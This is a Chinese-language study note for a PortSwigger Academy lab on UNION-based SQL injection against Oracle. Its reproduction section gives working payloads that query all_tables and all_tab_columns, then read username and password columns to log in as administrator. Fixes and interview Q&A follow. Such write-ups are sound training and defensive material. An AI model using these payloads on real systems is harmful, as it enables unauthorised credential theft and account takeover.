# SQL 注入：列出 Oracle 数据库的内容

| 项 | 内容 |
|---|---|
| 来源 | PortSwigger Academy |
| 难度 | PRACTITIONER |
| 模块 | SQL 注入 |
| 日期 | 2026-09-18 |
| 耗时 | 待补充 |

## 一、漏洞原理

和 008 是同一条攻击链（**枚举表名 → 枚举列名 → 读取数据 → 登录**），区别只在 **Oracle 的元数据视图和写法不同**。

| 用途 | 非 Oracle（MySQL / PostgreSQL / SQL Server） | **Oracle** |
|---|---|---|
| 列出表 | `information_schema.tables` | **`all_tables`** |
| 列出列 | `information_schema.columns` | **`all_tab_columns`** |
| 表名大小写 | 通常小写 | **通常大写** |

**Oracle 用 `all_*` 系列数据字典视图，没有 `information_schema`。**

### 关于 `FROM dual`（这题的一个易混点）

Oracle 要求每条 `SELECT` 都指定数据源。但**这题枚举表时不需要 `FROM dual`** —— 因为 `all_tables` 本身就是一张表，`FROM all_tables` 已经满足语法。

> **`FROM dual` 只在"不查任何表"时才需要**，比如 `UNION SELECT 'abc','def' FROM dual`。

## 二、复现步骤

**第 0 步：确认列数与字符串列**（注意 Oracle 不查表时要 `FROM dual`）

```
category=Gifts' UNION SELECT 'abc','def' FROM dual--
```
→ 正常返回，确认 **2 列且都是字符串类型**

**第 1 步：列出所有表**

```
category=Gifts' UNION SELECT table_name,NULL FROM all_tables--
```

→ 找出装着凭据的表，名字形如 **`USERS_ABCDEF`（大写）**。

**第 2 步：列出该表的列**

```
category=Gifts' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
```

→ 找出用户名/口令列，形如 `USERNAME_ABCDEF` / `PASSWORD_ABCDEF`。

**注意**：`WHERE table_name='...'` 里的表名**要大写**，和第 1 步看到的一致。

**第 3 步：读取内容**

```
category=Gifts' UNION SELECT USERNAME_ABCDEF,PASSWORD_ABCDEF FROM USERS_ABCDEF--
```

**第 4 步：登录 administrator** → 过关

**关键点**：全程的表名、列名都来自枚举结果（含随机后缀），**猜不出来**。Oracle 这边还要注意**大写**，写成小写查不到。

## 三、根本原因

同 008：用户输入被拼进 SQL，且应用账号有权读数据库自身的数据字典。

**Oracle 特有的暴露面**：`all_tables` / `all_tab_columns` 是 Oracle 的**数据字典视图**，默认对普通账号可读 —— 这让整个库的结构对注入者透明。

**另外，`v$*` 动态性能视图（006 用的 `v$version`）也是同类问题** —— 数据库把不该给业务账号看的东西，一并开放了。

## 四、修复方案

1. **参数化查询** —— 根治
2. **数据库账号最小权限** —— 撤销应用账号对 `all_tables` / `all_tab_columns` / `v$*` 等数据字典与动态性能视图的访问权
3. **口令哈希存储** —— 读到哈希也登不进去
4. **关闭详细错误回显** —— 不给报错型探针
5. **表/列命名规范化** —— 注意这**不是安全措施**（靶场就是随机的，枚举一次就暴露），只是可维护性

## 五、面试问答

**Q：Oracle 上怎么枚举表和列？**
A：`SELECT table_name FROM all_tables`；`SELECT column_name FROM all_tab_columns WHERE table_name='xxx'`。注意表名通常**大写**。

**Q：Oracle 有 `information_schema` 吗？**
A：没有。`information_schema` 是 MySQL / PostgreSQL / SQL Server 的；Oracle 对应 `all_tables` / `all_tab_columns`（还有 `user_tables`、`dba_tables` 等不同权限级别）。

**Q：什么时候必须写 `FROM dual`？**
A：当 `SELECT` 不查任何实际表时，例如 `UNION SELECT NULL,NULL FROM dual`。如果 `FROM` 后面跟的是真实存在的表（如 `all_tables`），就不需要 `dual`。

**Q：为什么枚举出的表名有大写有小写？**
A：Oracle 默认把未加引号的标识符转成**大写**存储，所以数据字典里的表名/列名通常是大写。查询时写小写就匹配不上。

**Q：`all_tables` 和 `dba_tables` 有什么区别？**
A：权限范围不同。`all_tables` 是当前账号有权限访问的表；`dba_tables` 是全库所有表，需要 DBA 权限。注入时通常只能读到 `all_tables`。

## 六、参考

- [Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
- [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)

## 标签

`#SQL注入` `#Oracle` `#all_tables` `#all_tab_columns` `#元数据枚举`
